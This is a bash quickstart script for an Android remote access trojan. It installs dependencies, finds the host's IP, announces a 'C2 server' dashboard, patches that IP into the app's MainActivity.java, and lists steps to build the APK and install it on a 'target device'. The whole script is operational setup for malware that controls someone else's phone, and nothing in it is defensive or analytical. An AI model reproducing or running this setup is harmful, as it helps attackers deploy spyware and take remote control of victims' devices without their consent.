#!/bin/bash
# Quickstart script for Android RAT

echo "🚀 Android RAT Quickstart"
echo ""

# Install Python dependencies
echo "📦 Installing Python dependencies..."
pip3 install -r requirements.txt

# Get server IP
SERVER_IP=$(hostname -I | awk '{print $1}')

echo ""
echo "╔═══════════════════════════════════════════════════════╗"
echo "║  START C2 SERVER                                      ║"
echo "╠═══════════════════════════════════════════════════════╣"
echo "║  Server IP: $SERVER_IP                           ║"
echo "║  Dashboard: http://$SERVER_IP:5000                ║"
echo "╚═══════════════════════════════════════════════════════╝"
echo ""

# Update MainActivity.java with server IP
sed -i "s/YOUR_SERVER_IP/$SERVER_IP/g" app/src/main/java/com/androidrat/MainActivity.java

echo "✅ Updated MainActivity.java with server IP"
echo ""
echo "📝 Next steps:"
echo "1. Start server: python3 server.py"
echo "2. Build APK: ./build.sh"
echo "3. Install APK on target device"
echo "4. Access dashboard: http://$SERVER_IP:5000"
echo ""
